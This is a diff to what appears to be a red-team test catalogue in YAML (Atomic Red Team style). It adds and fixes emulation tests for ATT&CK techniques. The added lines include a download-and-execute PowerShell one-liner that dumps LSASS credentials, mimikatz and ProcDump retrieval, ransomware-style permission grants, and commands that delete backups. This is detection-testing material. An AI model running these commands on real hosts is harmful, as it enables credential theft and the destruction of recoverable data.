@@ -10149,12 +10149,12 @@ persistence:
 
 '
         name: command_prompt
-    - name: Bits download using destktopimgdownldr.exe (cmd)
+    - name: Bits download using desktopimgdownldr.exe (cmd)
       auto_generated_guid: afb5e09e-e385-4dee-9a94-6ee60979d114
-      description: "This test simulates using destopimgdwnldr.exe to download a malicious
-        file\ninstead of a desktop or lockscreen background img. The process that
-        actually makes \nthe TCP connection and creates the file on the disk is a
-        svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
+      description: "This test simulates using desktopimgdownldr.exe to download a
+        malicious file\ninstead of a desktop or lockscreen background img. The process
+        that actually makes \nthe TCP connection and creates the file on the disk
+        is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
         See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n"
       supported_platforms:
       - windows
@@ -20427,8 +20427,15 @@ credential-access:
 
 '
         get_prereq_command: |
+          $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
+          $request = [System.Net.WebRequest]::Create($url)
+          $response = $request.GetResponse()
+          $realTagUrl = $response.ResponseUri.OriginalString
+          $version = $realTagUrl.split('/')[-1]
+          $fileName = 'mimikatz_trunk.zip'
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
+          Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -20490,6 +20497,65 @@ credential-access:
 '
       executor:
         command: 'pypykatz live lsa
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Dump LSASS.exe Memory using Out-Minidump.ps1
+      auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
+        powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+        Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+      supported_platforms:
+      - windows
+      executor:
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'');
+          get-process lsass | Out-Minidump
+
+'
+        cleanup_command: 'Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: true
+    - name: Create Mini Dump of LSASS.exe using ProcDump
+      auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+        ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe
+
+        Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+        If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where resulting dump should be placed
+          type: Path
+          default: C:\Windows\Temp\lsass_dump.dmp
+        procdump_exe:
+          description: Path of Procdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'ProcDump tool from Sysinternals must exist on disk at specified
+          location (#{procdump_exe})
+
+'
+        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+      executor:
+        command: "#{procdump_exe} -accepteula -mm lsass.exe #{output_file}\n"
+        cleanup_command: 'del "#{output_file}" >nul 2> nul
 
 '
         name: command_prompt
@@ -21763,7 +21829,7 @@ credential-access:
         CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
         This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
         Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
-        See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
+        See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
       supported_platforms:
       - windows
       input_arguments:
@@ -22263,7 +22329,9 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
-        cleanup_command: del
+        cleanup_command: 'del #{copy_dest}\#{file_name} >nul 2>&1
+
+'
     - name: PowerDump Registry dump of SAM for hashes and usernames
       auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
       description: Executes a hashdump by reading the hasshes from the registry.
@@ -23118,8 +23186,7 @@ collection:
         get_prereq_command: |
           echo Downloading Winrar installer
           bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
-          echo Follow the installer prompts to install Winrar
-          #{rar_installer}
+          #{rar_installer} /S
       executor:
         name: command_prompt
         elevation_required: false
@@ -23136,6 +23203,26 @@ collection:
         rar a -p"blue" hello.rar (VARIANT)
       supported_platforms:
       - windows
+      input_arguments:
+        rar_installer:
+          description: Winrar installer
+          type: Path
+          default: "%TEMP%\\winrar.exe"
+        rar_exe:
+          description: The RAR executable from Winrar
+          type: Path
+          default: "%programfiles%/WinRAR/Rar.exe"
+      dependencies:
+      - description: 'Rar tool must be installed at specified location (#{rar_exe})
+
+'
+        prereq_command: 'if not exist "#{rar_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading Winrar installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
+          #{rar_installer} /S
       executor:
         name: command_prompt
         elevation_required: false
@@ -23143,7 +23230,7 @@ collection:
           mkdir .\tmp\victim-files
           cd .\tmp\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
-          rar a -hp"blue" hello.rar
+          "#{rar_exe}" a -hp"blue" hello.rar
           dir
     - name: Compress Data and lock with password for Exfiltration with winzip
       auto_generated_guid: 01df0353-d531-408d-a0c5-3161bf822134
@@ -23196,6 +23283,26 @@ collection:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        7zip_installer:
+          description: 7zip installer
+          type: Path
+          default: "%TEMP%\\7zip.exe"
+        7zip_exe:
+          description: Path to installed 7zip executable
+          type: Path
+          default: "%ProgramFiles%\\7-zip\\7z.exe"
+      dependencies:
+      - description: '7zip tool must be installed at specified location (#{7zip_exe})
+
+'
+        prereq_command: 'if not exist "#{7zip_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading 7-zip installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2002-x64.exe" #{7zip_installer}
+          #{7zip_installer} /S
       executor:
         name: command_prompt
         elevation_required: false
@@ -23203,7 +23310,7 @@ collection:
           mkdir $PathToAtomicsFolder\T1560.001\victim-files
           cd $PathToAtomicsFolder\T1560.001\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
-          7z a archive.7z -pblue
+          "#{7zip_exe}" u archive.7z *txt -pblue
           dir
     - name: Data Compressed - nix - zip
       auto_generated_guid: c51cec55-28dd-4ad2-9461-1eacbc82c3a0
@@ -23352,7 +23459,9 @@ collection:
           zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./*
           echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
           ls -l #{test_folder}
-        cleanup_command: 'rm -Rf #{test_folder}'
+        cleanup_command: 'rm -Rf #{test_folder}
+
+'
   T1123:
     technique:
       id: attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967
@@ -25999,12 +26108,12 @@ defense-evasion:
 
 '
         name: command_prompt
-    - name: Bits download using destktopimgdownldr.exe (cmd)
+    - name: Bits download using desktopimgdownldr.exe (cmd)
       auto_generated_guid: afb5e09e-e385-4dee-9a94-6ee60979d114
-      description: "This test simulates using destopimgdwnldr.exe to download a malicious
-        file\ninstead of a desktop or lockscreen background img. The process that
-        actually makes \nthe TCP connection and creates the file on the disk is a
-        svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
+      description: "This test simulates using desktopimgdownldr.exe to download a
+        malicious file\ninstead of a desktop or lockscreen background img. The process
+        that actually makes \nthe TCP connection and creates the file on the disk
+        is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
         See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n"
       supported_platforms:
       - windows
@@ -33420,9 +33529,11 @@ defense-evasion:
       - Windows
       identifier: T1127.001
     atomic_tests:
-    - name: MSBuild Bypass Using Inline Tasks
+    - name: MSBuild Bypass Using Inline Tasks (C#)
       auto_generated_guid: 58742c0f-cb01-44cd-a60b-fb26e8871c93
-      description: 'Executes the code in a project file using. C# Example
+      description: 'Executes the code in a project file using msbuild.exe. The default
+        C# project example file (T1127.001.csproj) will simply print "Hello From a
+        Code Fragment" and "Hello From a Class." to the screen.
 
 '
       supported_platforms:
@@ -33451,6 +33562,42 @@ defense-evasion:
         get_prereq_command: |
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj" -OutFile "#{filename}"
+      executor:
+        command: "#{msbuildpath}\\#{msbuildname} #{filename}\n"
+        name: command_prompt
+    - name: MSBuild Bypass Using Inline Tasks (VB)
+      auto_generated_guid: ab042179-c0c5-402f-9bc8-42741f5ce359
+      description: 'Executes the code in a project file using msbuild.exe. The default
+        Visual Basic example file (vb.xml) will simply print "Hello from a Visual
+        Basic inline task!" to the screen.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        filename:
+          description: Location of the project file
+          type: Path
+          default: PathToAtomicsFolder\T1127.001\src\vb.xml
+        msbuildpath:
+          description: Default location of MSBuild
+          type: Path
+          default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
+        msbuildname:
+          description: Default name of MSBuild
+          type: Path
+          default: msbuild.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Project file must exist on disk at specified location (#{filename})
+
+'
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml" -OutFile "#{filename}"
       executor:
         command: "#{msbuildpath}\\#{msbuildname} #{filename}\n"
         name: command_prompt
@@ -37644,7 +37791,7 @@ defense-evasion:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
         command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
-          /s #{dll_name}) ELSE ( regsvr32.exe /s #{regsvr32path}\#{regsvr32name} )
+          /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
 
 '
         name: command_prompt
@@ -42037,15 +42184,24 @@ defense-evasion:
           del #{file_or_folder}\T1222.001_attrib*.txt
           rmdir #{file_or_folder}
         name: command_prompt
-    - name: Grant Full Access to Entire C:\ Drive for Everyone - Ryuk Ransomware Style
+    - name: Grant Full Access to folder for Everyone - Ryuk Ransomware Style
       auto_generated_guid: ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6
-      description: Invokes the command line used by Ryuk Ransomware to grant full
-        access to the entire C:\ drive for Everyone.
+      description: |
+        Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\ drive for Everyone.
+        **icacls "C:\*" /grant Everyone:F /T /C /Q**
+        However, for this atomic we set the permission on C:\Users\Public so it completes faster and doesn't irreversibly affect the host.
+        You can set your own path variable to "C:\*" if you prefer.
       supported_platforms:
       - windows
+      input_arguments:
+        path:
+          description: Path of folder to recursively set permissions on
+          type: path
+          default: C:\Users\Public\*
       executor:
-        command: icacls "C:\*" /grant Everyone:F /T /C /Q
-        name: powershell
+        command: icacls "#{path}" /grant Everyone:F /T /C /Q
+        name: command_prompt
+        elevation_required: true
   T1220:
     technique:
       id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
@@ -43391,7 +43547,7 @@ impact:
 '
         name: command_prompt
         elevation_required: true
-    - name: Windows - Delete Windows Backup Catalog
+    - name: Windows - wbadmin Delete Windows Backup Catalog
       auto_generated_guid: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c
       description: |
         Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
@@ -43399,7 +43555,7 @@ impact:
       supported_platforms:
       - windows
       executor:
-        command: 'wbadmin.exe delete catalog -quiet
+        command: 'wbadmin delete catalog -quiet
 
 '
         name: command_prompt
@@ -43445,6 +43601,21 @@ impact:
       executor:
         command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
           c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Windows - wbadmin Delete systemstatebackup
+      auto_generated_guid: 584331dd-75bc-4c02-9e0b-17f5fd81c748
+      description: 'Deletes the Windows systemstatebackup using wbadmin.exe. This
+        technique is used by numerous ransomware families. This may only be successful
+        on server platforms that have Windows Backup enabled.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'wbadmin delete systemstatebackup -keepVersions:0
 
 '
         name: command_prompt
